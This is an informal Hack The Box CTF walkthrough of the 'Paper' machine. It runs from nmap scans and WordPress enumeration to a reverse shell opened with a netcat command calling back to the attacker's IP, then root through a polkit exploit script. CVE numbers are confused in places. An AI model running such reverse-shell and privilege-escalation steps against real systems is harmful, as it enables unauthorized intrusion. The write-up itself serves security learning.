Paper and cve-2021-3650
I do htb ctf and I'm tryin' to be better every day. This time we gonna exploit polkit vulnerability again. Now let's cut to the chase and root this server.

+ First thing I always do is nmap to find any possible port open. I use this command with -T5 for insane speed but reduce accuracy -n to skip DNS resolution(translating IP to the domain name)
  nmap -p- --open -T5 -v -n 10.10.11.143
  1.txt
+ After this I do a deeper scan with the default scanning script to find any interesting information but It is just normal data.
  nmap -sCV -p22,80,443  -v -n 10.10.11.143
  4.txt
+ After this I realize that there is 22, 80, 443 port open so I do curl to collect header information also I do whatweb and collect the same domain name for backend-server that is office.paper
  curl --head 10.10.11.143
  whatweb 10.10.11.143
  2.txt
+ To access this domain we have to put office.paper domain and 10.10.11.143 ip address into host address folder in order to host this website on our page
  nano /etc/hosts
  9.txt
+ for a couple of minutes wandering around office.paper I find a login section and they use wordpress with version 5.2.3(you can use what web to find out wordpress version)
  then I use searchsploit and find out it is vulnerable to cross-site host modification so go online to search for any information about this security hole.
  searchsploit wordpress 5.2.3
+ VUL1
+ So I understand about this security hole. I use searchsploit with -p 47690 to access information about this hole eventually they shows some guilds.
  8.txt
+ I follow and find some secret chat page links with domain name chat.office.paper(you know what to do). After reading around I find that I can inject a reverse shell with recycle bot by this command. And of course, on my computer, I set a shell lister on port 1234 to bind the shell.
  running nc -e /bin/bash 10.10.14.9 1234
  chat.png
+ now I got the reverse shell I upload python3 -c 'import pty; pty.spawn("/bin/bash")' to make shell look clearer. then I run linpeas.sh and find out its vulnerable 
  to cve-2021-4034 and cve-2021-3560 I try to exploit cve-2021-4043 but It seem impossible cuz they fixed it by requiring root permission to execute the invironment variable
  in UTF convert library file. So I chose the other one and It works well.
+ I upload the script then give execute permission to the file then execute it. ./s.sh -u=khoi -p=1
+ In final, I change user right to my created user(khoi) with su - khoi type my password in then I successfully run root with my user authority. And yeah we own the server.
